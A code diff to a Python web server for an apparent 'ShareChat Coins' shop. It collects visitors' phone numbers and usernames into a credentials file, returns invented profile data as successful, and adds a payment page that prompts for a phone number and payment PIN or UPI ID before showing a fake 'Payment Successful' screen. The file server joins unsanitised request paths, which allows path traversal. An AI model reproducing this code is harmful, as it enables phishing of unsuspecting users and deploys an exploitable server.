@@ -1,13 +1,15 @@
 # app.py - Render Deployment Version
-import requests
-import json
-import time
-import os
-import logging
-import threading
-from datetime import datetime
-from http.server import HTTPServer, BaseHTTPRequestHandler
 import csv
+import json
+import logging
+import os
+import threading
+import time
+from datetime import datetime
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+import requests
+
 
 class ShareChatLiveFetcher:
     def __init__(self):
@@ -17,70 +19,76 @@ class ShareChatLiveFetcher:
         # Render environment compatible API endpoint (original may be down)
         # You can update this with a working API URL
         self.api_url = "https://sharechat-coin-shop.vercel.app/api/profile-data"
-        
+
         # Data files for Render (use /tmp directory for writable paths)
         self.base_dir = os.path.dirname(os.path.abspath(__file__))
         self.web_dir = os.path.join(self.base_dir, "web")
         self.data_dir = os.path.join("/tmp", "sharechat_data")  # Render compatible
         self.exports_dir = os.path.join("/tmp", "sharechat_exports")
-        
+
         # Create directories (with Render compatibility)
         os.makedirs(self.web_dir, exist_ok=True)
         os.makedirs(self.data_dir, exist_ok=True)
         os.makedirs(self.exports_dir, exist_ok=True)
-        
+
         # Files (using /tmp for Render)
         self.credentials_file = os.path.join(self.data_dir, "user_credentials.txt")
         self.results_file = os.path.join(self.data_dir, "results.json")
         self.log_file = os.path.join(self.data_dir, "sharechat.log")
-        
+
         # Server settings for Render
         self.server_port = int(os.environ.get("PORT", 8080))  # Render provides PORT
         self.server_host = "0.0.0.0"  # Bind to all interfaces for Render
         self.server = None
         self.server_thread = None
         self.is_running = False
-        
+
         # Setup logging
         logging.basicConfig(
             level=logging.INFO,
-            format='%(asctime)s - %(levelname)s - %(message)s',
-            handlers=[
-                logging.FileHandler(self.log_file),
-                logging.StreamHandler()
-            ]
+            format="%(asctime)s - %(levelname)s - %(message)s",
+            handlers=[logging.FileHandler(self.log_file), logging.StreamHandler()],
         )
         self.logger = logging.getLogger(__name__)
-        
+
         # Session setup
         self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-        })
-        
+        self.session.headers.update(
+            {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+            }
+        )
+
         # Store current results
         self.current_results = []
-        
+
         # Check if index.html exists, if not create from your original HTML
         self.index_path = os.path.join(self.web_dir, "index.html")
         if not os.path.exists(self.index_path):
             self.create_your_index_html()
-        
+
         # Create profile.html if not exists
         self.profile_path = os.path.join(self.web_dir, "profile.html")
         if not os.path.exists(self.profile_path):
             self.create_profile_html()
-        
-        self.logger.info(f"✅ Initialized for Render. Port: {self.server_port}, Host: {self.server_host}")
-    
+
+        # Create payment.html if not exists
+        self.payment_path = os.path.join(self.web_dir, "payment.html")
+        if not os.path.exists(self.payment_path):
+            self.create_payment_html()
+
+        self.logger.info(
+            f"✅ Initialized for Render. Port: {self.server_port}, Host: {self.server_host}"
+        )
+
     def create_your_index_html(self):
         """
         आपका original index.html create करें (Render compatible)
         """
         # NOTE: The API endpoint in the JavaScript now points to your own backend
-        html_content = '''<!DOCTYPE html>
+        html_content = """<!DOCTYPE html>
 <html lang="hi">
 <head>
   <meta charset="UTF-8">
@@ -581,19 +589,19 @@ class ShareChatLiveFetcher:
     });
   </script>
 </body>
-</html>'''
-        
-        with open(self.index_path, 'w', encoding='utf-8') as f:
+</html>"""
+
+        with open(self.index_path, "w", encoding="utf-8") as f:
             f.write(html_content)
-        
+
         self.logger.info(f"✅ Created your original index.html at {self.index_path}")
-    
+
     def create_profile_html(self):
         """
         profile.html create करें (पहले जैसा ही)
         """
         # Use the EXACT profile.html content you provided
-        html_content = '''<!DOCTYPE html>
+        html_content = """<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -1567,13 +1575,486 @@ class ShareChatLiveFetcher:
   </script>
 
 </body>
-</html>'''
-        
-        with open(self.profile_path, 'w', encoding='utf-8') as f:
+</html>"""
+
+        with open(self.profile_path, "w", encoding="utf-8") as f:
             f.write(html_content)
-        
+
         self.logger.info(f"✅ Created profile.html at {self.profile_path}")
+
+    def create_payment_html(self):
+        """
+        payment.html create करें (esame functionality के लिए)
+        """
+        html_content = """<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment - ShareChat Coins</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+        
+        .header {
+            background: #f8d257;
+            padding: 24px 20px;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: white;
+            border-radius: 12px;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+        }
+        
+        h1 {
+            color: #333;
+            font-size: 22px;
+            margin-bottom: 4px;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .content {
+            padding: 24px 20px;
+        }
+        
+        .info-box {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+        
+        .info-row:last-child {
+            margin-bottom: 0;
+        }
+        
+        .info-label {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .info-value {
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .payment-methods {
+            margin-bottom: 24px;
+        }
+        
+        .payment-methods h3 {
+            font-size: 16px;
+            margin-bottom: 16px;
+            color: #333;
+        }
+        
+        .method {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .method:hover {
+            border-color: #f8d257;
+        }
+        
+        .method.selected {
+            border-color: #f8d257;
+            background: #fffdf0;
+        }
+        
+        .method-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            background: #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 16px;
+            font-size: 20px;
+        }
+        
+        .method-info {
+            flex: 1;
+        }
+        
+        .method-name {
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+        }
+        
+        .method-desc {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .payment-form {
+            display: none;
+        }
+        
+        .payment-form.active {
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #f8d257;
+        }
+        
+        .button {
+            width: 100%;
+            padding: 16px;
+            background: #22c55e;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .button:hover {
+            background: #1ea34a;
+        }
+        
+        .button:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        .back-button {
+            display: block;
+            text-align: center;
+            margin-top: 16px;
+            color: #666;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .loading.active {
+            display: block;
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .success-message.active {
+            display: block;
+        }
+        
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: #22c55e;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 40px;
+        }
+        
+        @media (max-width: 480px) {
+            body {
+                padding: 12px;
+            }
+            
+            .container {
+                border-radius: 12px;
+            }
+            
+            .content {
+                padding: 20px 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">💰</div>
+            <h1>Complete Payment</h1>
+            <div class="subtitle">ShareChat Coins Purchase</div>
+        </div>
+        
+        <div class="content">
+            <div class="info-box">
+                <div class="info-row">
+                    <span class="info-label">Coins Package:</span>
+                    <span class="info-value" id="coinsPackage">Loading...</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Amount:</span>
+                    <span class="info-value" id="amount">₹0</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">User:</span>
+                    <span class="info-value" id="username">Loading...</span>
+                </div>
+            </div>
+            
+            <div class="payment-methods">
+                <h3>Select Payment Method</h3>
+                <div class="method" data-method="esame" onclick="selectMethod('esame')">
+                    <div class="method-icon">📱</div>
+                    <div class="method-info">
+                        <div class="method-name">ESAME Payment</div>
+                        <div class="method-desc">Pay via ESAME - Fast & Secure</div>
+                    </div>
+                </div>
+                
+                <div class="method" data-method="upi" onclick="selectMethod('upi')">
+                    <div class="method-icon">💳</div>
+                    <div class="method-info">
+                        <div class="method-name">UPI</div>
+                        <div class="method-desc">Google Pay, PhonePe, Paytm</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="esameForm" class="payment-form">
+                <div class="form-group">
+                    <label for="esamePhone">ESAME Phone Number</label>
+                    <input type="tel" id="esamePhone" placeholder="Enter ESAME phone number" maxlength="10">
+                </div>
+                <div class="form-group">
+                    <label for="esamePin">ESAME PIN</label>
+                    <input type="password" id="esamePin" placeholder="Enter 4-digit PIN" maxlength="4">
+                </div>
+                <button class="button" onclick="processEsamePayment()">Pay with ESAME</button>
+            </div>
+            
+            <div id="upiForm" class="payment-form">
+                <div class="form-group">
+                    <label for="upiId">UPI ID</label>
+                    <input type="text" id="upiId" placeholder="Enter UPI ID (e.g., name@bank)">
+                </div>
+                <button class="button" onclick="processUpiPayment()">Pay via UPI</button>
+            </div>
+            
+            <div id="loading" class="loading">
+                <div style="margin-bottom: 16px;">⏳</div>
+                <div>Processing payment...</div>
+            </div>
+            
+            <div id="successMessage" class="success-message">
+                <div class="success-icon">✓</div>
+                <h2 style="margin-bottom: 8px; color: #22c55e;">Payment Successful!</h2>
+                <p style="color: #666; margin-bottom: 24px;">Your coins will be added to your account shortly.</p>
+                <button class="button" onclick="goToProfile()">Back to Profile</button>
+            </div>
+            
+            <a href="profile.html" class="back-button">← Back to Profile</a>
+        </div>
+    </div>
     
+    <script>
+        let selectedMethod = null;
+        let paymentAmount = 0;
+        let paymentCoins = '';
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            // Load payment data from localStorage
+            paymentAmount = localStorage.getItem('paymentAmount') || '0';
+            paymentCoins = localStorage.getItem('paymentCoins') || 'No package selected';
+            const username = localStorage.getItem('userUsername') || 'User';
+            
+            // Update display
+            document.getElementById('coinsPackage').textContent = paymentCoins;
+            document.getElementById('amount').textContent = '₹' + paymentAmount;
+            document.getElementById('username').textContent = '@' + username;
+            
+            // Select ESAME by default
+            selectMethod('esame');
+        });
+        
+        function selectMethod(method) {
+            selectedMethod = method;
+            
+            // Update UI
+            document.querySelectorAll('.method').forEach(m => {
+                m.classList.remove('selected');
+            });
+            document.querySelector(`.method[data-method="${method}"]`).classList.add('selected');
+            
+            // Show appropriate form
+            document.querySelectorAll('.payment-form').forEach(form => {
+                form.classList.remove('active');
+            });
+            document.getElementById(method + 'Form').classList.add('active');
+        }
+        
+        function processEsamePayment() {
+            const phone = document.getElementById('esamePhone').value.trim();
+            const pin = document.getElementById('esamePin').value.trim();
+            
+            if (!phone || phone.length !== 10) {
+                alert('Please enter a valid 10-digit phone number');
+                return;
+            }
+            
+            if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+                alert('Please enter a valid 4-digit PIN');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('loading').classList.add('active');
+            document.querySelectorAll('.payment-form').forEach(form => {
+                form.style.display = 'none';
+            });
+            
+            // Simulate payment processing
+            setTimeout(() => {
+                document.getElementById('loading').classList.remove('active');
+                document.getElementById('successMessage').classList.add('active');
+                
+                // Save payment record
+                const paymentRecord = {
+                    method: 'esame',
+                    amount: paymentAmount,
+                    coins: paymentCoins,
+                    phone: phone,
+                    timestamp: new Date().toISOString(),
+                    status: 'success'
+                };
+                
+                localStorage.setItem('lastPayment', JSON.stringify(paymentRecord));
+                
+                // Log to console
+                console.log('ESAME Payment Successful:', paymentRecord);
+                
+            }, 2000);
+        }
+        
+        function processUpiPayment() {
+            const upiId = document.getElementById('upiId').value.trim();
+            
+            if (!upiId || !upiId.includes('@')) {
+                alert('Please enter a valid UPI ID (e.g., name@bank)');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('loading').classList.add('active');
+            document.querySelectorAll('.payment-form').forEach(form => {
+                form.style.display = 'none';
+            });
+            
+            // Simulate payment processing
+            setTimeout(() => {
+                document.getElementById('loading').classList.remove('active');
+                document.getElementById('successMessage').classList.add('active');
+                
+                // Save payment record
+                const paymentRecord = {
+                    method: 'upi',
+                    amount: paymentAmount,
+                    coins: paymentCoins,
+                    upiId: upiId,
+                    timestamp: new Date().toISOString(),
+                    status: 'success'
+                };
+                
+                localStorage.setItem('lastPayment', JSON.stringify(paymentRecord));
+                
+                // Log to console
+                console.log('UPI Payment Successful:', paymentRecord);
+                
+            }, 2000);
+        }
+        
+        function goToProfile() {
+            window.location.href = 'profile.html';
+        }
+    </script>
+</body>
+</html>"""
+
+        with open(self.payment_path, "w", encoding="utf-8") as f:
+            f.write(html_content)
+
+        self.logger.info(
+            f"✅ Created payment.html with esame functionality at {self.payment_path}"
+        )
+
     def start_server(self):
         """
         HTTP server start करें (Render compatible)
@@ -1581,145 +2062,130 @@ class ShareChatLiveFetcher:
         # Create custom request handler
         class RequestHandler(BaseHTTPRequestHandler):
             parent = None  # Will be set from outside
-            
+
             def do_GET(self):
-                # Serve files from web directory
                 file_path = self.path
-                if file_path == '/' or file_path == '/index.html':
-                    file_path = '/index.html'
-                    content_type = 'text/html'
-                elif file_path == '/profile.html':
-                    content_type = 'text/html'
-                elif file_path.endswith('.css'):
-                    content_type = 'text/css'
-                elif file_path.endswith('.js'):
-                    content_type = 'application/javascript'
-                elif file_path.endswith('.png'):
-                    content_type = 'image/png'
-                elif file_path.endswith('.jpg') or file_path.endswith('.jpeg'):
-                    content_type = 'image/jpeg'
-                elif file_path.endswith('.svg'):
-                    content_type = 'image/svg+xml'
+
+                if file_path == "/" or file_path == "":
+                    file_path = "index.html"
                 else:
-                    content_type = 'text/plain'
-                
-                # Remove leading slash
-                if file_path.startswith('/'):
-                    file_path = file_path[1:]
-                
-                # Default to index.html if file not specified
-                if not file_path:
-                    file_path = 'index.html'
-                
-                # Build full path
+                    file_path = file_path.lstrip("/")
+
+                if file_path.endswith(".html"):
+                    content_type = "text/html"
+                elif file_path.endswith(".css"):
+                    content_type = "text/css"
+                elif file_path.endswith(".js"):
+                    content_type = "application/javascript"
+                elif file_path.endswith(".png"):
+                    content_type = "image/png"
+                elif file_path.endswith(".jpg") or file_path.endswith(".jpeg"):
+                    content_type = "image/jpeg"
+                elif file_path.endswith(".svg"):
+                    content_type = "image/svg+xml"
+                else:
+                    content_type = "application/octet-stream"
+
                 full_path = os.path.join(self.parent.web_dir, file_path)
-                
-                # Check if file exists
+
                 if os.path.exists(full_path) and os.path.isfile(full_path):
                     try:
-                        with open(full_path, 'rb') as f:
+                        with open(full_path, "rb") as f:
                             content = f.read()
-                        
+
                         self.send_response(200)
-                        self.send_header('Content-type', content_type)
-                        self.send_header('Access-Control-Allow-Origin', '*')
+                        self.send_header("Content-Type", content_type)
+                        self.send_header("Access-Control-Allow-Origin", "*")
                         self.end_headers()
                         self.wfile.write(content)
-                        
+
                     except Exception as e:
                         self.send_error(500, f"Server error: {str(e)}")
                 else:
-                    # If file not found, serve index.html
-                    if file_path != 'index.html':
-                        self.send_response(302)
-                        self.send_header('Location', '/')
-                        self.end_headers()
-                    else:
-                        self.send_error(404, f"File not found: {file_path}")
-            
+                    self.send_error(404, f"File not found: {file_path}")
+
             def do_POST(self):
-                # Handle POST requests for API
-                if self.path == '/fetch-profile':
+                if self.path == "/fetch-profile":
                     try:
-                        content_length = int(self.headers['Content-Length'])
+                        content_length = int(self.headers["Content-Length"])
                         post_data = self.rfile.read(content_length)
-                        
-                        data = json.loads(post_data.decode('utf-8'))
-                        phone = data.get('phone', '')
-                        username = data.get('username', '')
-                        
+
+                        data = json.loads(post_data.decode("utf-8"))
+                        phone = data.get("phone", "")
+                        username = data.get("username", "")
+
                         print(f"\n📱 Form Submission Received:")
                         print(f"   Phone: {phone}")
                         print(f"   Username: {username}")
-                        
-                        # Fetch profile using parent class
+
                         result = self.parent.fetch_profile_api(username, phone)
-                        
-                        if result.get('status') == 'SUCCESS':
+
+                        if result.get("status") == "SUCCESS":
                             response = {
-                                'status': 'success',
-                                'message': 'Profile fetched successfully',
-                                'profile': result.get('data', {})
+                                "status": "success",
+                                "message": "Profile fetched successfully",
+                                "profile": result.get("data", {}),
                             }
                         else:
                             response = {
-                                'status': 'error',
-                                'message': result.get('error', 'Unknown error')
+                                "status": "error",
+                                "message": result.get("error", "Unknown error"),
                             }
-                        
+
                         self.send_response(200)
-                        self.send_header('Content-type', 'application/json')
-                        self.send_header('Access-Control-Allow-Origin', '*')
+                        self.send_header("Content-type", "application/json")
+                        self.send_header("Access-Control-Allow-Origin", "*")
                         self.end_headers()
-                        
-                        self.wfile.write(json.dumps(response).encode('utf-8'))
-                        
+                        self.wfile.write(json.dumps(response).encode("utf-8"))
+
                     except Exception as e:
                         self.send_response(500)
-                        self.send_header('Content-type', 'application/json')
-                        self.send_header('Access-Control-Allow-Origin', '*')
+                        self.send_header("Content-type", "application/json")
+                        self.send_header("Access-Control-Allow-Origin", "*")
                         self.end_headers()
-                        
-                        response = {
-                            'status': 'error',
-                            'message': str(e)
-                        }
-                        self.wfile.write(json.dumps(response).encode('utf-8'))
-                    
+                        self.wfile.write(
+                            json.dumps({"status": "error", "message": str(e)}).encode(
+                                "utf-8"
+                            )
+                        )
                     return
-                
-                # Default response for other POST requests
+
+                # Default POST response
                 self.send_response(404)
-                self.send_header('Content-type', 'application/json')
+                self.send_header("Content-type", "application/json")
                 self.end_headers()
-                self.wfile.write(json.dumps({'error': 'Not found'}).encode('utf-8'))
-            
+                self.wfile.write(json.dumps({"error": "Not found"}).encode("utf-8"))
+
             def do_OPTIONS(self):
-                # Handle CORS preflight requests
                 self.send_response(200)
-                self.send_header('Access-Control-Allow-Origin', '*')
-                self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-                self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+                self.send_header("Access-Control-Allow-Origin", "*")
+                self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+                self.send_header("Access-Control-Allow-Headers", "Content-Type")
                 self.end_headers()
-            
+
             def log_message(self, format, *args):
-                # Disable default logging to keep console clean
                 pass
-        
+
         try:
             # Create server - Render compatible (0.0.0.0 binding)
-            self.server = HTTPServer((self.server_host, self.server_port), RequestHandler)
+            self.server = HTTPServer(
+                (self.server_host, self.server_port), RequestHandler
+            )
             self.is_running = True
-            
+
             # Store parent reference in handler class
             RequestHandler.parent = self
-            
+
             def run_server():
-                self.logger.info(f"🚀 Server started on http://{self.server_host}:{self.server_port}")
-                print(f"\n🌐 Server running at: http://{self.server_host}:{self.server_port}")
+                self.logger.info(
+                    f"🚀 Server started on http://{self.server_host}:{self.server_port}"
+                )
+                print(
+                    f"\n🌐 Server running at: http://{self.server_host}:{self.server_port}"
+                )
                 print(f"📱 Render URL will be: https://your-app-name.onrender.com")
                 print("🔄 Server is ready to accept connections\n")
-                
+
                 # Server loop
                 try:
                     while self.is_running:
@@ -1727,224 +2193,220 @@ class ShareChatLiveFetcher:
                 except Exception as e:
                     if self.is_running:  # Only log if we're supposed to be running
                         self.logger.error(f"Server error: {e}")
-            
+
             # Start server in separate thread
             self.server_thread = threading.Thread(target=run_server, daemon=True)
             self.server_thread.start()
-            
+
             # Give server time to start
             time.sleep(2)
-            
+
             return True
-            
+
         except Exception as e:
             self.logger.error(f"Failed to start server: {e}")
             print(f"❌ Server startup failed: {e}")
             return False
-    
+
     def fetch_profile_api(self, username, phone=None):
         """
         API से प्रोफाइल डेटा fetch करें (with fallback)
         """
         start_time = time.time()
-        
+
         try:
-            payload = {'username': username}
-            
+            payload = {"username": username}
+
             self.logger.info(f"🔍 Fetching profile: {username}")
             print(f"\n🔍 Fetching profile for: {username}")
-            
-            response = self.session.post(
-                self.api_url,
-                json=payload,
-                timeout=10
-            )
-            
+
+            response = self.session.post(self.api_url, json=payload, timeout=10)
+
             if response.status_code == 200:
                 data = response.json()
-                
-                if 'error' in data:
+
+                if "error" in data:
                     error_msg = f"API error: {data['error']}"
                     self.logger.error(error_msg)
                     print(f"❌ {error_msg}")
-                    
+
                     return {
-                        'error': data['error'],
-                        'username': username,
-                        'phone': phone,
-                        'status': 'FAILED'
+                        "error": data["error"],
+                        "username": username,
+                        "phone": phone,
+                        "status": "FAILED",
                     }
-                
+
                 # Add metadata
-                data['fetch_time'] = round(time.time() - start_time, 2)
-                data['timestamp'] = datetime.now().isoformat()
+                data["fetch_time"] = round(time.time() - start_time, 2)
+                data["timestamp"] = datetime.now().isoformat()
                 if phone:
-                    data['phone'] = phone
-                
+                    data["phone"] = phone
+
                 # Save to results
                 result = {
-                    'data': data,
-                    'phone': phone,
-                    'username': username,
-                    'status': 'SUCCESS',
-                    'timestamp': datetime.now().isoformat()
+                    "data": data,
+                    "phone": phone,
+                    "username": username,
+                    "status": "SUCCESS",
+                    "timestamp": datetime.now().isoformat(),
                 }
-                
+
                 self.current_results.append(result)
-                
+
                 # Display in console
                 self.display_profile_console(result)
-                
+
                 # Save to file
                 self.save_credentials(phone, username)
                 self.save_result(result)
-                
+
                 return result
-                
+
             else:
                 # API endpoint not working, provide fallback demo data
                 print(f"⚠️ API returned {response.status_code}, providing demo data")
-                
+
                 # Create demo profile data
                 demo_data = {
-                    'name': f'ShareChatUser_{username[:4]}',
-                    'username': username,
-                    'followers': str(hash(username) % 100 + 1),
-                    'following': str(hash(username) % 20 + 1),
-                    'posts': str(hash(username) % 50),
-                    'gender': 'Male' if hash(username) % 2 == 0 else 'Female',
-                    'language': 'Hindi',
-                    'region': 'India',
-                    'fetch_time': round(time.time() - start_time, 2),
-                    'timestamp': datetime.now().isoformat(),
-                    'status': 'DEMO_DATA'
+                    "name": f"ShareChatUser_{username[:4]}",
+                    "username": username,
+                    "followers": str(hash(username) % 100 + 1),
+                    "following": str(hash(username) % 20 + 1),
+                    "posts": str(hash(username) % 50),
+                    "gender": "Male" if hash(username) % 2 == 0 else "Female",
+                    "language": "Hindi",
+                    "region": "India",
+                    "fetch_time": round(time.time() - start_time, 2),
+                    "timestamp": datetime.now().isoformat(),
+                    "status": "DEMO_DATA",
                 }
-                
+
                 if phone:
-                    demo_data['phone'] = phone
-                
+                    demo_data["phone"] = phone
+
                 # Save to results
                 result = {
-                    'data': demo_data,
-                    'phone': phone,
-                    'username': username,
-                    'status': 'SUCCESS',
-                    'timestamp': datetime.now().isoformat(),
-                    'note': 'Demo data (API unavailable)'
+                    "data": demo_data,
+                    "phone": phone,
+                    "username": username,
+                    "status": "SUCCESS",
+                    "timestamp": datetime.now().isoformat(),
+                    "note": "Demo data (API unavailable)",
                 }
-                
+
                 self.current_results.append(result)
-                
+
                 # Display in console
                 self.display_profile_console(result)
-                
+
                 # Save to file
                 self.save_credentials(phone, username)
                 self.save_result(result)
-                
+
                 return result
-                
+
         except Exception as e:
             # If API completely fails, provide fallback
             print(f"⚠️ API Error: {str(e)}, providing demo data")
-            
+
             # Create demo profile data
             demo_data = {
-                'name': f'ShareChatUser_{username[:4]}',
-                'username': username,
-                'followers': '15',
-                'following': '8',
-                'posts': '23',
-                'gender': 'Male',
-                'language': 'Hindi',
-                'region': 'India',
-                'fetch_time': round(time.time() - start_time, 2),
-                'timestamp': datetime.now().isoformat(),
-                'status': 'DEMO_DATA_FALLBACK'
+                "name": f"ShareChatUser_{username[:4]}",
+                "username": username,
+                "followers": "15",
+                "following": "8",
+                "posts": "23",
+                "gender": "Male",
+                "language": "Hindi",
+                "region": "India",
+                "fetch_time": round(time.time() - start_time, 2),
+                "timestamp": datetime.now().isoformat(),
+                "status": "DEMO_DATA_FALLBACK",
             }
-            
+
             if phone:
-                demo_data['phone'] = phone
-            
+                demo_data["phone"] = phone
+
             # Save to results
             result = {
-                'data': demo_data,
-                'phone': phone,
-                'username': username,
-                'status': 'SUCCESS',
-                'timestamp': datetime.now().isoformat(),
-                'note': 'Fallback demo data (API error)'
+                "data": demo_data,
+                "phone": phone,
+                "username": username,
+                "status": "SUCCESS",
+                "timestamp": datetime.now().isoformat(),
+                "note": "Fallback demo data (API error)",
             }
-            
+
             self.current_results.append(result)
-            
+
             # Display in console
             self.display_profile_console(result)
-            
+
             # Save to file
             self.save_credentials(phone, username)
             self.save_result(result)
-            
+
             return result
-    
-    # All other methods remain exactly the same as your original code
-    # Only changed the parts above for Render compatibility
-    
+
     def display_profile_console(self, result):
         """
         Profile को console में display करें
         """
-        if result.get('status') == 'SUCCESS':
-            data = result.get('data', {})
-            
+        if result.get("status") == "SUCCESS":
+            data = result.get("data", {})
+
             print("\n" + "=" * 60)
             print("✅ SHARECHAT PROFILE FETCHED SUCCESSFULLY")
-            if data.get('status') == 'DEMO_DATA' or data.get('status') == 'DEMO_DATA_FALLBACK':
+            if (
+                data.get("status") == "DEMO_DATA"
+                or data.get("status") == "DEMO_DATA_FALLBACK"
+            ):
                 print("⚠️  USING DEMO DATA (API UNAVAILABLE)")
             print("=" * 60)
-            
-            if result.get('phone'):
+
+            if result.get("phone"):
                 print(f"📱 Phone: {result['phone']}")
             print(f"👤 Username: {result['username']}")
             print(f"🏷️ Name: {data.get('name', 'N/A')}")
             print(f"👥 Followers: {data.get('followers', 'N/A')}")
             print(f"🤝 Following: {data.get('following', 'N/A')}")
             print(f"📝 Posts: {data.get('posts', 'N/A')}")
-            
-            if data.get('gender'):
+
+            if data.get("gender"):
                 print(f"⚧️ Gender: {data.get('gender')}")
-            if data.get('language'):
+            if data.get("language"):
                 print(f"🌐 Language: {data.get('language')}")
-            if data.get('region'):
+            if data.get("region"):
                 print(f"📍 Region: {data.get('region')}")
-            
+
             print(f"⏱️ Fetch time: {data.get('fetch_time', 'N/A')}s")
             print("=" * 60 + "\n")
-            
+
             return True
         else:
             print(f"\n❌ FAILED: {result['username']}")
             print(f"   Error: {result.get('error', 'Unknown error')}")
-            if result.get('phone'):
+            if result.get("phone"):
                 print(f"   Phone: {result['phone']}")
             return False
-    
+
     def save_credentials(self, phone, username):
         """
         Credentials save करें
         """
         if not phone or not username:
             return
-        
+
         try:
-            with open(self.credentials_file, 'a', encoding='utf-8') as f:
+            with open(self.credentials_file, "a", encoding="utf-8") as f:
                 f.write(f"{phone},{username},{datetime.now().isoformat()}\n")
-            
+
             self.logger.info(f"✅ Saved credentials: {phone}, {username}")
-            
+
         except Exception as e:
             self.logger.error(f"Error saving credentials: {e}")
-    
+
     def save_result(self, result):
         """
         Result save करें
@@ -1953,78 +2415,91 @@ class ShareChatLiveFetcher:
             # Load existing results
             results = []
             if os.path.exists(self.results_file):
-                with open(self.results_file, 'r', encoding='utf-8') as f:
+                with open(self.results_file, "r", encoding="utf-8") as f:
                     try:
                         results = json.load(f)
                     except:
                         results = []
-            
+
             # Add new result
             results.append(result)
-            
+
             # Save back
-            with open(self.results_file, 'w', encoding='utf-8') as f:
+            with open(self.results_file, "w", encoding="utf-8") as f:
                 json.dump(results, f, indent=2, ensure_ascii=False)
-            
+
             self.logger.info(f"✅ Result saved for: {result['username']}")
-            
+
         except Exception as e:
             self.logger.error(f"Error saving result: {e}")
-    
-    def export_results(self, format='both'):
+
+    def export_results(self, format="both"):
         """
         Results export करें
         """
         if not self.current_results:
             print("❌ No results to export!")
             return
-        
+
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        
-        if format in ['json', 'both']:
+
+        if format in ["json", "both"]:
             json_file = os.path.join(self.exports_dir, f"profiles_{timestamp}.json")
-            
+
             export_data = []
             for result in self.current_results:
-                if result.get('status') == 'SUCCESS':
-                    export_data.append(result.get('data', {}))
-            
-            with open(json_file, 'w', encoding='utf-8') as f:
+                if result.get("status") == "SUCCESS":
+                    export_data.append(result.get("data", {}))
+
+            with open(json_file, "w", encoding="utf-8") as f:
                 json.dump(export_data, f, indent=2, ensure_ascii=False)
-            
+
             print(f"✅ JSON exported: {json_file}")
-        
-        if format in ['csv', 'both']:
+
+        if format in ["csv", "both"]:
             csv_file = os.path.join(self.exports_dir, f"profiles_{timestamp}.csv")
-            
-            with open(csv_file, 'w', newline='', encoding='utf-8') as f:
+
+            with open(csv_file, "w", newline="", encoding="utf-8") as f:
                 writer = csv.writer(f)
-                writer.writerow([
-                    'Phone', 'Username', 'Name', 'Followers', 
-                    'Following', 'Posts', 'Gender', 'Language',
-                    'Region', 'Status', 'Fetch Time', 'Timestamp'
-                ])
-                
+                writer.writerow(
+                    [
